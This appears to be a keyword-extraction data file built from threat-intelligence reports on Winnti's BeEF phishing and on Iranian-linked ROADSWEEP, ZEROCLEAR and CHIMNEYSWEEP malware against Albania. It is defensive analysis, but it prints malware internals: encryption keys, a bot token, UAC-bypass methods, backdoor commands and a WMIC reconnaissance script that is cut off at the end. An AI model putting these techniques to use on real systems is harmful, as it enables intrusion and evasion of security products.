Inc. Cluster25 experts are specialized in hunting and collecting cyber threats, analysis, reverse-engineering and adversary hunting practices. Cluster25 independently designs and develops technologies aimed at the classification and categorization of malicious artifacts as well as for their correlation with known threat groups. Relying on extensive visibility into the digital threat landscape, it overcomes the usual limitations of services based on ex-post threat observation by providing real predictive and proactive intelligence services. Visit us at cluster25.io ©2021 Cluster25. All rights reserved. The reproduction and distribution of this material is prohibited without express writtenpermission from Cluster25. Traffic Light Protocol (TLP) violation could lead to the immediate cancellation of existing services as well as the initiation of legal actions aimed at protecting the intellectual property and competitive advantage of DuskRise Inc. Given theinherent nature of threat intelligence, the content contained in this report is based on information gathered and understood at the time of its creation. The information in this report is general in nature and does not take into account the specific needs of your IT ecosystemand network, which may vary and require unique action. As such, Cluster25 provides the information and content on an “as-is” basis without representation or warranty and accepts no liability for any action or failure to act taken in response to the informationcontained or referenced in this report. The reader is responsible for determining whether or not to follow any of the suggestions, recommendations or potential mitigations set out in this report, entirely at their own discretion. ","{'phrases': ['The attack', 'the victim', 'Russian', 'the background', 'Control', 'the next stage payload', 'a CAB file', 'the CAB file', 'configuration file', 'the BAT', 'The Konni RAT', 'files', 'System32', 'a Windows service', 'process', 'the data', 'commands'], 'target': 'The attack; the victim; Russian; the background; Control; the next stage payload; a CAB file; the CAB file; configuration file; the BAT; The Konni RAT; files; System32; a Windows service; process; the data; commands.'}"
Spear phishing emails; a Japanese gaming studio; link; the victim; a link; a fake resume; a browser; The link; BeEF; The BeEF hook script; GitHub; C2; server; process; addition.,"['1. Spear phishing emails are sent containing links to fake resumes. 2. The resume pages load BeEF exploitation scripts. 3. BeEF modules are used to exploit the visiting victim. 4. Malware is delivered that communicates with C2 servers on ports 53, 80, 443, 8000. 5. Stolen certificates from gaming organizations are used to sign the malware. ']","Extract the keywords: Winnti Evolution - Going Open SourceBACK TO BLOG POSTSProtectWise recently observed a burst of activity and change of tactics from an advanced actor group commonly referred to as “Winnti.” The purpose of this post is to share details of the group’s recent activity in an effort to assist the public in searching for related activity in their networks and preventing future attacks.About WinntiThe Winnti group has been active since roughly 2010. Signiﬁcant previous research has been published on  the group from a variety of sources, such as Kaspersky, Blue Coat, and TrendMicro. As far back as 2011, the group was detected attacking multiple video game studios, including some in South Korea and Japan, likely attempting to steal various in-game currencies and to compromise developers’ certiﬁcates and source  code. Objectives:Theft of digital certiﬁcates  Use of stolen certiﬁcates to sign malware  Theft of gaming source code and infrastructure detailsTTPs:Known Toolset: PIVY, Chopper, PlugX, ZxShell, Winnti Phishing HR/recruiting emails for initial infection vector CHM email ﬁle attachments containing malware  Use of GitHub for C2 communicationTargets:Online video game organizations Defense Sector Internet Service ProvidersAttribution:Originating Location: China (high conﬁdence)  Potential Aliases: Wicked Panda, APT17Evolution of Winnti - Open source tools, and macOS targeting:Within the Winnti campaigns observed by ProtectWise, the use of open source tooling was common. Speciﬁcally, the group has been utilizing the Browser Exploitation Framework (BeEF) and Metasploit  Meterpreter. The use of open source tools by advanced actor groups has become increasingly common, as discussed by our colleagues in the industry. To the best of our knowledge, this is a new technique for the Winnti group and we expect it to be used in future attacks. Also noteworthy are attempts to deliver JAR ﬁles containing macOS applications which have meterpreter  functionality. In addition, victims running Windows were delivered MSI ﬁles which were built using a free  EXE to MSI converter (url 1: Summary of attack progression.Delivery:The Winnti campaign detailed in this post began with spear phishing emails aimed at a Japanese gaming studio’s staff. At least one of these emails claimed it was from an applicant for a job posting who was listing their relevant experience, along with a link to their resume.Figure 2: Winnti Phishing Email. The approximate translation of the Winnti phishing email is as follows:“I saw your job posting. My main languages are Object-C, JAVA, and Swift, and I have 7 years experience with Ruby and 6 years experience with PHP. I have 5 years experience developing iOS apps, as well as Android apps, AWS, Jenkins, Microsoft Azure, ZendFramework, and smartphone application payment processing. I also have 5 years experience with MSSQL, Mysql, Oracle, and PostgreSQL. Please see here: <URL>”We observed Winnti using two different techniques when the link was clicked. In the ﬁrst technique, the user  was directed to an HTML page which loaded a fake English resume. In the second technique, which we only observed a few times, the landing page directly downloaded a JAR ﬁle to the victim’s machine. Figure 3: Fake resume loaded in a browser. Some items blurred as content may have been stolen.Figure 4: Fake resume continued.Landing:In cases where the above resume is loaded, it is delivered as follows: {Phishing Email Link}/?session={date}{ID} This page is an HTML ﬁle containing a simple iframe instruction to load real.html. Figure 5: Link-click landing page HTML content. real.html This is the HTML ﬁle containing the fake resume which will load in a browser for the link-click victim. It  contains a script which loads the BeEF hook script from a separate external host. The group’s infrastructure changes rapidly, occasionally allowing us to observe them modifying the hook page destination domain over the span of a few minutes. Sometimes the same destination would be referred to by IP in one version of real.html and by hostname in another. Two additional ﬁles, resume_screen.css and mypic.jpg, are also loaded to make the resume look  more realistic with improved formatting.Figure 6: Added hook.js load request placed in a fake resume. At this point, in cases where BeEF has been used, exploits are typically attempted on victim hosts with the help of BeEF modules. A commonly used module was Jenkins_groovy_code_exec.Evasion Techniques:One of the Winnti group’s distinctive techniques is their particular style of DNS resolution for their C2 domains. Choosing domain names which are similar to valid domains (for example, google-statics[.]com, a misspelling of Google statistics, instead of analytics.google.com), the group conﬁgures their DNS so that the  root domain resolves to either nothing, or localhost (previous research has observed the root domain resolving to the valid domain it is imitating; we did not observe that in this campaign). Then a subdomain resolves to an actual C2 server. For example, google-statics[.]com, one of the C2 domains observed in this campaign has no resolutions at the time of writing. css.google-statics[.]com, however, resolves to a real C2 IP. As observed in previous Winnti attacks, the group uses commonly accepted and poorly monitored protocols and ports for their C2 communication (ports 53, 80, 443). With the addition of BeEF, the group has made use of TCP port 8000 as well. Amusingly, the group's use of BeEF has been fairly rudimentary, not even taking advantage of the basic obfuscation features included in the program. We observed the group using GAGAHOOK instead of the default BEEFHOOK session name and BEEFSESSION session cookie name.Figure 7: BeEF hook.js request. As in previous Winnti campaigns, the group continues to use legitimate code signing certiﬁcates, stolen from  online gaming organizations, to sign their malware. This technique can help to hide the malicious intent of the group’s code, allowing it to run in environments where execution is restricted to signed/trusted programs. While unconﬁrmed as of this writing, we believe the Winnti group is continuing to steal and use  certiﬁcates from new organizations. Associated Indicators:Note: We are redacting the malware hashes while we work with the organization whose digital signature was used on the malware as a potential victim of the Winnti group. Indicator job.yoyakuweb[.]technology resume.immigrantlol[.]com macos.exoticlol[.]com css.google-statics[.]com minami[.]cc vps2java.securitytactics[.]com Phishing email link destination. Phishing email link destination. Likely phishing email link destination. BeEF Landing and C2. Potential BeEF - Low conﬁdence (Linode)  Malware C2 Phishing email link destination. Used in BeEF C2, reused Winnit Infra. Linode - Used in BeEF C2. Linode - Malware C2. Linode - Used in BeEF C2. Linode - Used in BeEF C2. Linode - hosting BeEF landings.Type IPTOM HEGEL, SENIOR THREAT RESEARCHER & NATE MARX, ASSOCIATE THREAT RESEARCHERThreat ResearchNEXT BLOG POST[SHARE]SIGN UP FOR BLOG UPDATESENTER YOUR EMAIL HERESIGN UPFEATURED POSTSWebinar Recap: See Clearly and Respond Quickly from the Network to the EndpointDavid GoldWannaCry Ransomware Review and Global ImpactTom HegelBuilding a Great Threat Hunting Practice in the CloudJames CondonBLOG CATEGORIESPerspectives ","{'phrases': ['spear phishing emails', 'Fake resume', 'the resume', 'IP', 'BeEF modules', 'use', 'C2', 'ports', '53', '80', '443', 'gaming organizations', 'the malware'], 'target': 'spear phishing emails; Fake resume; the resume; IP; BeEF modules; use; C2; ports; 53; 80; 443; gaming organizations; the malware.'}"
the threat actor; a video; the ROADSWEEP ransom note; the Albanian government; documents; the ROADSWEEP malware; the ZEROCLEAR wiper; an Iranian opposition organization; July 2022; the operation; a video; a link; the Telegram channel; documents; the legitimate user; the malware; DURRES; Iranian; organizations; the ZEROCLEAR wiper; Iranian.,"['1. Ransomware Deployment - ROADSWEEP ransomware used to encrypt systems at Albanian government organizations. 2. Data Theft - Documents and data allegedly stolen from compromised systems. 3. Defacement - Disruptive activity taken down Albanian government websites. 4. Public Leaks - Stolen documents and ransomware execution video leaked publicly via the ""HomeLand Justice"" front. 5. Wiping - Possible use of ZEROCLEAR wiper to corrupt systems. 6. Attribution - Links found between the activity and Iranian threat actors based on technical evidence. ']","Extract the keywords: www.mandiant.com /resources/likely-iranian-threat-actor-conducts-politically-motivated-disruptive-activity-against Likely Iranian Threat Actor Conducts Politically Motivated Disruptive Activity Against Albanian Government OrganizationsExecutive SummaryMandiant identified the ROADSWEEP ransomware family and a Telegram persona which targeted the Albanian government in a politically motivated disruptive operation ahead of an Iranian opposition organization’s conference in late July 2022. A previously unknown backdoor CHIMNEYSWEEP and a new variant of the ZEROCLEAR wiper may also have been involved. CHIMNEYSWEEP malware distribution data and decoy content, the operation’s timing and politically themed content, and the possible involvement of the ZEROCLEAR wiper indicate an Iranian threat actor is likely responsible. This activity is a geographic expansion of Iranian disruptive cyber operations, conducted against a NATO member state. It may indicate an increased tolerance of risk when employing disruptive tools against countries perceived to be working against Iranian interests. Please see the Technical Annex for relevant Yara rules and MITRE ATT&CK Techniques (T1007, T1012, T1027, T1033, T1055, T1057, T1070.004, T1070.006, T1082, T1083, T1087, T1112, T1113, T1134, T1489, T1497.001, T1518, T1543.003, T1569.002, and T1622).Threat DetailIn mid-July 2022, Mandiant identified a new ransomware family dubbed ROADSWEEP which drops a politically themed ransom note suggesting it targeted the Albanian government. In addition, a front named “HomeLand Justice” claimed credit for the disruptive activity that affected Albanian government websites and citizen services on July 18, 2022. The “HomeLand Justice” front posted a video of the ransomware being executed on its website and Telegram channel alongside alleged Albanian government documents and residence permits of ostensible members of the Mujahedeen-e-Khalq/People’s Mojahedin Organization of Iran (MEK, also known as MKO or PMOI), an Iranian opposition organization that was formerly designated as a terrorist group by the U.S. Department of State.On July 18, 2022, the Albanian government published a statement announcing it had to “temporarily close access to online public services and other government websites” due to disruptive cyber activity. On July 22, 2022, a ROADSWEEP ransomware sample was submitted to a public malware repository from Albania. Upon successful execution, this ROADSWEEP sample drops a ransom note including the text “Why should our taxes be spent on the benefit of DURRES terrorists?” (Figure 1). Durrës is a port city and the second most populous city in Albania.1/22Figure 1: ROADSWEEP ransom noteOn July 21, 2022, a front named “HomeLand Justice” leveraged the website “homelandjustice.ru” to start publishing ostensible news stories on the ransomware operation against the Albanian government along with a link to a Telegram channel named “HomeLand Justice.” The website, which implies that it is run by Albanian citizens, claimed credit for the ransomware activity with a video of “wiper activity,” and posted documents ostensibly internal to the Albanian government along with what it claimed to be Albanian residence permits of MEK members.The website “homelandjustice[.]ru” and the Telegram channel both use a banner that appears identical to the wallpaper used by ROADSWEEP and contains the same politically themed language as the ransom note above (Figure 2). The platforms also posted a video of an alleged wiper executed on a host using this banner.Figure 2: ROADSWEEP wallpaper and HomeLand Justice bannerAfter posting multiple links to news stories on the disruptive activity against the Albanian government on July 26, 2022, HomeLand Justice directly claimed credit for the operation on its Telegram channel in a message alleging corruption in the Albanian government and repeating the message from the ransom note (Figure 3). Notably, the posts used the hashtags #MKO, #ISIS, #Manez, and #HomeLandJustice. Manëz is a town in the Durrës County and the location for the World Summit of Free Iran conference which was set to take place on July 23-24.2/22Figure 3: HomeLand Justice claims creditBoth the homelandjustice.ru website and the Telegram channel posted documents ostensibly belonging to Albanian government organizations along with what appear to be residence permits, marriage certificates, passports, and other personal documents belonging to alleged members of the MEK.CHIMNEYSWEEP Backdoor Likely Targets Iranian Diaspora and DissidentsMandiant further identified CHIMNEYSWEEP, a backdoor that uses either Telegram or actor-owned infrastructure for command-and-control and is capable of taking screenshots, listing and collecting files, spawning a reverse shell, and supports keylogging functionality. CHIMNEYSWEEP shares code with ROADSWEEP and based on observed decoy content has likely been used to target Farsi and Arabic speakers as far back as 2012.CHIMNEYSWEEP and ROADSWEEP share multiple code overlaps, including identical dynamic API resolution code. The shared code includes an embedded RC4 key to decrypt Windows API function strings at run time, which are resolved using LoadLibrary and GetProcAddress calls once decrypted. Both capabilities also share the same Base64 custom alphabet, one used to encode the decryption key, the other for command and control. Both CHIMNEYSWEEP and ROADSWEEP use the RC4 key “8c e4 b1 6b 22 b5 88 94 aa 86 c4 21 e8 75 9d f3” and the custom Base64 alphabet “wxyz0123456789.- JKLMNOPghijklmnopqrstuvQRSTUVWXYZabcdefABCDEFGHI”.CHIMNEYSWEEP is dropped by a self-extracting archive signed with a valid digital certificate alongside either an Excel, Word, or video file which are likely used as benign decoy documents. However, these documents do not appear to be automatically opened when CHIMNEYSWEEP is executed.The decoy documents have included Arabic-language lists of names, ostensibly of individuals in Lebanon, and a figure of Massoud Rajavi, the former leader of the Mujahedeen-e-Khalq (MEK), an Iranian opposition group (Figure 2).We identified iterations of CHIMNEYSWEEP used as early as 2012.3/22Figure 4: Image of Massoud Rajavi in a Word document used as decoy content alongside CHIMNEYSWEEP in August 2021ZEROCLEAROn July 19, 2022, one day after the Albanian government announcement of the disruptive activity, an Albanian user submitted a ZEROCLEAR wiper payload to a public malware repository. The ZEROCLEAR payload takes in command line arguments from the operator and results in corruption of the file system using the RawDisk driver.While we are unable to independently prove or disprove whether the ZEROCLEAR sample was used in this or any disruptive operation, the malware has previously been publicly reported to have links to Iran-nexus threat actors deploying it in support of disruptive activity in the Middle East as recently as 2020. AttributionMandiant does not have evidence linking this activity to a named threat actor but assesses with moderate confidence that one or multiple threat actors who have operated in support of Iranian goals are involved. This is based on the timing of the disruptive activity, the MEK-focused content of the HomeLand Justice persona’s Telegram channel, and the long history of CHIMNEYSWEEP malware targeting Farsi and Arabic speakers.The city of Manëz, Durrës County, which were mentioned in the ROADSWEEP ransom note and on the HomeLand Justice Telegram channel, was set to host a conference “The World Summit of Free Iran” on July 23-24, 2022. Albanian media announced that on July 22 that the conference had been postponed due to a “terrorist attack threat.” The World Summit of Free Iran is a conference convening entities opposed to the government of Iran, specifically members of the MEK, in Manëz, Durrës County, Albania. Iranian and pro-Iran information operations have frequently targeted the MEK with antagonistic messaging, including that leveraging fabricated material such as forged documents. For example, the pro-Iran campaign Roaming Mayfly has promoted falsified narratives alleging various Western countries’ support for the MEK. We have previously reported on the suspected Iran-nexus ZEROCLEAR and DUSTMAN wipers, which have reportedly targeted entities in Bahrain and Saudi Arabia.4/22However, we do note that the ransomware attack is significantly more complex than prior CHIMNEYSWEEP operations, which raises the possibility of a cross-team collaboration or other scenarios that we lack insight into at this time. We are continuing to investigate this cluster and will provide updates as we are able.Outlook and ImplicationsMandiant has frequently reported on Iranian threat activity targeting Iranian dissidents and opposition groups abroad by cyber espionage groups such as UNC788 and malware such as SCRAPWOOD, publicly known as MarkiRAT. Additionally, numerous recent lock-and-leak operations by suspected Iran-nexus personas such as Black Shadow and Moses Staff have involved disruptive activity against primarily Israeli organizations in an attempt to embarrass them.The use of ransomware to conduct a politically motivated disruptive operation against the government websites and citizen services of a NATO member state in the same week an Iranian opposition groups’ conference was set to take place would be a notably brazen operation by Iran-nexus threat actors. As negotiations surrounding the Iran nuclear deal continue to stall, this activity indicates Iran may feel less restraint in conducting cyber network attack operations going forward. This activity is also a geographic expansion of Iranian disruptive cyber operations, conducted against a NATO member state. It may indicate an increased tolerance of risk when employing disruptive tools against countries perceived to be working against Iranian interests.Technical Annex A: ROADSWEEP RansomwareROADSWEEP is a newly discovered ransomware tool, which upon execution will enumerate files on the device and encrypts the content in blocks using RC4. Window API names, malware configuration parameters, and the basis of a ransomware note are RC4 encrypted within ROADSWEEP. During execution, ROADSWEEP will decrypt these Compiled on 2016/04/30 17:08:19ROADSWEEP requires four command line arguments to execute correctly, otherwise ROADSWEEP will produce a message box and halt execution. Upon successful execution, ROADSWEEP creates the following global mutex:abcdefghijklmnoklmnopqrstuvwxyz01234567890abcdefghijklmnopqrstuvwxyz01234567890Following initialization, ROADSWEEP will begin resolving the necessary APIs using the Windows GetProcAddress API. The function names are encrypted using RC4 with the hardcoded key ""8c e4 b1 6b 22 b5 88 94 aa 86 c4 21 e8 75 9d f3"".ROADSWEEP contains multiple embedded scripts which are used to either execute additional commands or to remove itself from the victim’s device. These scripts are never written to disk, instead ROADSWEEP will create a new command prompt (cmd.exe), then send these commands to the process with a pipe. The scripts are embedded within the binary as RC4 encrypted blocks and are decrypted at runtime by the payload. The first script decrypted by ROADSWEEP is responsible for disabling settings like SystemRestore and Volume Shadow Copies, along with first is a list of extensions that should be avoided when the encryption occurs:.exe .lckROADSWEEP also decrypts the filename for the ransomware note, ""How_To_Unlock_MyFiles.txt"" (MD5: producing a random data stream using the algorithm shown in Figure 6, then hashing this value with MD5 and using this as an RC4 key.Figure 6: Key generation algorithmROADSWEEP then encrypts this key with an embedded RSA public key and proceeds to format the ransomware message by appending the Base64 encoded and encrypted “recovery key” to the message itself. The Base646/22encoding uses a custom alphabet of ""wxyz0123456789.- JKLMNOPghijklmnopqrstuvQRSTUVWXYZabcdefABCDEFGHI"".Figure 7: ROADSWEEP recovery key encryption and ransom note formattingNext, ROADSWEEP enumerates all logical drives on the victim's device and checks whether the drive is one of the DRIVE_CDROMFigure 8: Drive selection and wiper thread creationFor each discovered drive, ROADSWEEP will initialize a new thread which is responsible for encrypting all files within that drive. This thread enumerates the file system using the Windows FindFirstFileW and FindNextFileW APIs. For each root directory, a ransomware note is created with the content and filename noted above.Following this, ROADSWEEP will check whether the files within the directory match the extracted extension list, if they do not the file is encrypted. The encryption process takes place by renaming the file with the “.lck” extension. ROADSWEEP then takes the creation time, last access time, and last write time for the file and stores these internally. These values are then used after the wipe to preserve the file times, although the purpose of this is currently unknown.ROADSWEEP will then open the file and compute the size using the GetFileSize API. Then by chunking the file’s content into blocks of 0x100000, ROADSWEEP will read in the data, encrypt the chunk using RC4, and then overwrite the file to disk. This is completed until the entire file is overwritten.7/22Following this, the aforementioned self-delete script is executed and the process exits.Technical Annex B: ZEROCLEAR VariantWe identified a ZEROCLEAR payload which takes in command line arguments from the operator and results in Compiled on 2022/07/15 13:26:28The first command line argument must be one of the following:""wp"" (default) – Wipes the disk using the ElDos driver, this expects the driver to be running for the wiper activity to occur. ""in"" – Installs and starts the driver named rwdsk.sys, which is expected to be located in the same directory as ZEROCLEAR. “un” – Uninstalls the driver named rwdsk and deletes the file on disk.The second argument is the drive letter that the operator wants to corrupt, previous variants of ZEROCLEAR only wiped the system drive, determined from calling the GetSystemDirectoryW API.ZEROCLEAR then opens a handle to the RawDisk driver by opening a handle to the following:""\\? \RawDisk3<arg2>#B4B615C28CCD059CF8ED1ABF1C71FE03C0354522990AF63ADF3C911E2287A4B906D47DIt then computes the disk size using the Windows IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, IOCTL_DISK_GET_DRIVE_GEOMETRY and IOCTL_DISK_GET_LENGTH_INFO DeviceIoControl calls. The ElDos driver is used to overwrite the data with the value ""0"".Technical Annex C:CHIMNEYSWEEP BackdoorWhile Mandiant was unable to uncover the infection vector for CHIMNEYSWEEP, we note that the dropper has a valid digital signature. In addition to dropping the CHIMNEYSWEEP installer, this dropper also contains either an Excel or Word document or an MP4 video file.The dropper is a signed version of a Windows Cabinet self-extracting file, which is signed by the now revoked certificate ""Atheros Communications Inc."" As of 2022-07-28, the certificate used in the ROADSWEEP campaign has not been revoked. Historically we have seen APT41 also use this signature, although as noted by DUO the password for this certificate was widely available. The threat actor’s choice of signing certificate and dropper is likely based on the fact the legitimate Atheros certificate was used to distribute legitimate drivers using the legitimate dropper. This indicates the threat actors have a high degree of operational security.Upon execution, the self-extracting tool finds the resource named “Cabinet”, drops it to disk, and then executes a Compile time: 2021/07/26 13:39:17 C&C servers:8/22telegram-update[.]com avira[.]ltd Compile time: 2021/07/26 13:39:17 C&C servers:telegram-update[.]com avira.ltd Compile time: 2021/07/26 13:39:17 C&C servers:telegram-update[.]com avira.ltd Compile time: 2021/07/26 13:39:17 C&C servers:telegram-update[.]com avira.ltd Compile time: 2021/06/11 22:53:53 C&C servers:telegram-update[.]com avira.ltd Compile time: 2020/01/25 18:11:10 C&C servers:telegram-update[.]com avira.ltd Compile time: 2020/09/21 11:44:32 C&C servers:telegram-update[.]com Compile time: 2018/10/08 17:28:39 C&C servers:cloud-avira[.]com pgp.eu[.]com server-avira[.]com skype.se[.]net uk2privat[.]com update-pgp[.]comExecutionAfter being dropped by the dropper, the installer is executed. The installer, some of which are padded with null bytes (0x00) to inflate their size, is responsible for deploying an embedded executable to disk and then executing the backdoor itself. The installer initially drops the payload as “m.d” in the covert store (""C:\ProgramData\Microsoft Installer{EA2C6B24-C590-457B-BAC8-4A0F9B13B5B8}\Force""). Some of the installers forge the dropped file’s CreationTime, LastAccessTime, and LastWrite time from C:\Windows\System32\smss.exeThe installer then executes the “Alloc” export which checks whether the device is currently running DeepFreeze by Faronics, although this is not applicable for the samples analysed by Mandiant. If the process name contains “creensaver.”, the backdoor will write the image to %SYSTEM32%\Slui and then execute a task named ""\\Microsoft\\Windows\\License Manager\\LicenseExchange\"". Alloc ultimately calls the Control_Provider export, which will initiate the backdoor.The main functionality is provided in the next export called by the installer, “RatingSetupUI”. This export is responsible for all the command-and-control (C&C) interactions and backdoor capabilities.The last two exports are related to the update process. “Control_Provider” manages the update process whereas “Telephon” executes the “Control_Provider” function.If the backdoor is not running as an administrator, the backdoor may use embedded payloads to escalate privileges. A mutex named “rerunadmn” is used internally by the backdoor and the two RC4 encrypted payloads are extracted. The first payload is a .NET loader, which loads the second payload and calls the type ""vjp5ZPP9AidVjXxofy"" and modules looking for the above class and methods. If they exist, it will execute that module. If the module is not loaded, the assembly is loaded and then executed in memory. The backdoor will then pass through the string “AD” if the payload is already executing as Administrator or the path to a temporary file on disk, directly to the loaded .net module. This temporary file is created by writing the content of the Software\AppDataLoad\GLX\aex and writing the content to the Windows %TEMP% directory with the name APPX.<random_values>.tmp. This file is a copy of the backdoor itself. If the payload can’t resolve the export CP from the loader, it reverts to invoking PowerShell with the following command, passing in the path to the second payload, the type and method and either AD or the path to the ensuring that the payload is running with administrator privileges. This payload is obfuscated by reactor and contains encrypted strings used throughout the execution. Upon execution, the payload will create the mutex “rerunadmn” and “subttoadmn”. The module utilises the following techniques to execute the payload as administrator:10/221. Makes use of the Windows “SilentCleanup” scheduled task. This task executes the executable running in%windir%\system32\cleanmgr.exe, and the payload uses the Windows Registry Environment key to change the %windir% variable to point to c:\Windows. Next, the payload creates a new System32 folder and copies an alongside a .cfg file with the content “slc”. Following this, the task is executed. This technique is similar to a technique within Metasploit called bypassuac_silentcleanup.2. Makes use of the windows CMSTP.exe binary to install a malicious Microsoft Connection Manager Profile onthe device. This technique drops cln.vbs to the c:\windows\temp folder (MD5: payload contains two RunPreSetupCommandsSection values, one for the payload itself, and the second for executing the cln.vbs script. The legitimate cmstp.exe will then be executed on the host which executes the backdoor and then the clean-up script. This technique is identical to a technique made public in 2017 by Oddvar Moe.CHIMNEYSWEEP has the following major functionality:Screenshot collection: Takes screenshots of the compromised device on a timer and stores to disk or can be tasked to take a screenshot and upload. File collection and listing: Monitors for new removable drives and performs directory listing on demand, enumerates directories for files that match a set list, and can be tasked to upload a file to the command-and- control server. Keylogging: Monitors the content of the clipboard and performs key logging to disk. Reverse shell: Contains a reverse shell which can be utilised by the attacker.Initial configuration formatThe backdoor contains settings that are found either encrypted within the payload or stored in the registry (Software\AppDataLow\GLX\Setting). The values stored in the registry will be provided from the update mechanism. The configuration is split using the tags {BEGIN} and &{END}, and each value within the settings are referenced by an integer. For extracting the C&C values, the parser stores a reference to values 30-39 where each reference can be a different C&C and URI in order.Figure 9: Example C&C configurationBased on our analysis we assess that the IDs correspond to the following settings:Table 1: Configuration keysPurpose Perform file collection Perform directory listing of new drives Perform key loggingId 311/22Monitor clipboard data Boolean value as to whether the actor should take screenshots The timeout value between each screenshot Default JPEG quality for BMP2JPGpourVBFrance export Execute system information command4 9-29 Missing 30-39 C&C information 40File collection configNetwork communications and commandsDuring the initialisation of CHIMNEYSWEEP, a thread is created which makes HTTP GET requests to url The response is checked for the string ""{""ok"":false,"" and if that string is present, the threat actor attempts to use Telegram for C&C communications.The threat actor used the following Telegram bots:Table 2: Telegram channels by actorURI Path bot661217919:AAG9PrAybrKF5y8HxMA14THNZtWXw5Sv4w net21007bot net21007 -1001188059110These Telegram channels appear to have been in use by the threat actor for a significant period and have messages in the hundreds of thousands which relate to individual tasks. The backdoor uses Telegram’s GetUpdates API endpoint, which returns a list of messages for the bot. The backdoor then parses this data to execute specific commands, download additional payloads, or to create a reverse shell. Data sent and received by the Telegram channel are encoded using Base64 and the same alphabet as ROADSWEEP.Within the context of Telegram, CHIMNEYSWEEP uses a unique identifier for the victim based on the computer name and username prepended by TL. This ID is used for filtering commands for the specific device:TL_<computer_name>-<user_name>Following the victim identifier, the backdoor uses the string 1 to indicate a task for the update process and 2 to indicate a command to execute on the host.If Telegram is not available, the threat actor communicates to threat actor-owned infrastructure. This infrastructure is embedded within the payload and may include one or multiple of the following:url url url url url url url url url url C&C communication protocol consists of several HTTP requests to the server using the argument “do” to specify the command id and “arg” to transfer associated data. Communication to these servers is done with a specific User- Agent, which includes the victim's computer name and username in the following format:12/22<status_code>:---:<Computer_Name>-<User_Name>:---:init:---:www:---:MNEWUpon initialization, the backdoor will create two networking threads, one for managing updates and the second for managing tasking:Command Id022022-28Table 3: Update communicationsPurpose Response processUpdates settings within the backdoor like the current C&C for this communication channel or the settings in the registryUpdate pluginsRC4 encrypted executable, which is written to the disk, time stomped to be between 2010-2021, then executed. The backdoor uses the mutex ""runupdate"" before executing the executable, then after the process returns, will check for the mutex ""runupdateok"". If this mutex exists, the backdoor instance who requested the update is terminated.RC4 encrypted data which is written to disk, then executed.RC4 encrypted data which will be written to registry values. The purpose of these plugins is not fully understood, although Mandiant were able to ascertain that ""p22jpd"" is used for the screenshot converter.Update processCHIMNEYSWEEP can update itself by downloading an executable. Mandiant was unable to obtain a copy of this updater. However, this update mechanism likely executes the Control_Provider export. This export establishes a number of mutexes including: runupdateok, baserun, heyirunadmn and corerun. The updater logic first creates the mutex runupdate, that is checked by the Control_Provider, then waits for the runupdateok mutex before killing itself.Tasking communicationsA second thread is started to handle incoming tasking from either the C&C server or Telegram. The command effectively works by downloading a request from the server, then parsing this request into a format that is then parsed by CHIMNEYSWEEP. Payloads are delivered either using the custom Base64 algorithm for Telegram, or in plain text for the standard C&C server.Mandiant was unable to identify each individual field used and believe these may be reserved for future, or used with historic iterations of the backdoor.Commands are made up of 12 distinct arguments encased in square braces. As shown in Figure 10:Figure 10: Tasking command structureThe backdoor checks for the existence of the ""[Z]"", and that the string ends with a ""]"". The arguments are then passed back to the main C&C loop. The timeout is the value in seconds that is slept prior to executing any command on the system.13/22Figure 11: CHIMNEYSWEEP command parsingThe following commands are supported in variants analysed by Mandiant:Table 4: Tasking communication task listPurpose Execute a task on host Upload a screenshot Update screenshot settings and upload a Uploads a sc Takes a screenshot using either the b.j file from the covert store or the Windows APIs, store the screenshot on disk then upload to the C2.Command 41200TaskingCHIMNEYSWEEP enables two distinct routes to execute commands on the box, a reverse shell and an interactive custom command prompt. In addition to this, the backdoor enables the threat actor to reboot or shutdown the system or logoff the current user.Table 5: Command options for local taskCommand Action 104Start the custom command prompt Start a reverse shell Shutdown the system using shutdown /s /t 0 /f Reboot the system using shutdown /r /t 0 /f Logoff the current user using shutdown /l /f14/22Figure 12: Command optionsFor both shells, the command creates a socket to the address and port in the original packet. For the reverse shell, a cmd.exe process is started with the pipes set to the socket. A packet is sent to the C&C server to inform it that a shell is starting. This packet consists of the following string ""CSP><computer_identifier>>"", upon termination of the shell by the user, the string ""DC><computer_idenitifer>>"" is sent.The custom command prompt allows the following commands:CS - Used to indicate the start of a command session along with the computer_identifier LD - List drivers LP - list files in path LPG - Not implemented SF - Opens a file, returns the file size SFG - Opens the file and uploads the content in chunks of 0x400 bytes RF - Retrieves a file and writes to disk REN - Rename a file DEL - Delete a file DELF - Delete a directory CRTD - Creates a directory EXEC - Executes a command on disk DC - Disconnects the shell HI - Return ""OOK>""Screenshot functionCHIMNEYSWEEP can be configured to take the screenshots and if the JPEG converter plugin (stored in the p22jpd registry value) is present, convert the images to JPEG. The JPEG settings can be configured by the threat actor in the request as discussed above. Screenshots are taken using the Windows APIs and written to disk in the covert store with the name APPX.%x%x%x%x%x.tmp, where each %x is a random value.Depending on whether the JPEG plugin exists, CHIMNEYSWEEP will either copy the temporary file into the requested file, or using the plugin, convert the bitmap into a JPEG as defined by the command.The output value is then either uploaded to Telegram or the C&C server using command 41. Mandiant was able to @set t=""%cd%\ni"" @set f=""%cd%\i1"" @cd %SystemRoot%\system32 @echo {{WMIC_AntiVirusProduct}}>%t% @wmic /failfast:on /append:%t% /namespace:\\root\SecurityCenter2 path AntiVirusProduct get /value @echo {{WMIC_AntiSpywareProduct}}>>%t% @wmic /failfast:on /append:%t% /namespace:\\root\SecurityCenter2 path AntiSpywareProduct get /value @echo {{WMIC_FirewallProduct}}>>%t% @wmic /failfast:on /append:%t% /namespace:\\root\SecurityCenter2 path FirewallProduct get /value @echo {{WMIC_OS}}>>%t% @wmic /failfast:on /append:%t% OS get /value @echo {{WMIC_TIMEZONE}}>>%t% @wmic /failfast:on /append:%t% TIMEZONE get /value @echo {{WMIC_LOGON}}>>%t% @wmic /failfast:on /append:%t% LOGON get /value @echo {{WMIC_DESKTOP}}>>%t% @wmic /failfast:on /append:%t% DESKTOP get /value @echo {{WMIC_DESKTOPMONITOR}}>>%t% @wmic /failfast:on /append:%t% DESKTOPMONITOR get /value @echo {{WMIC_BASEBOARD}}>>%t% @wmic /failfast:on /append:%t% BASEBOARD get /value @echo {{WMIC_BIOS}}>>%t% @wmic /failfast:on /append:%t% BIOS get /value @echo {{WMIC_CPU}}>>%t% @wmic /failfast:on /append:%t% CPU get /value @echo {{WMIC_SOUNDDEV}}>>%t% @wmic /failfast:on /append:%t% SOUNDDEV get /value @echo {{WMIC_LOGICALDISK}}>>%t% @wmic /failfast:on /append:%t% 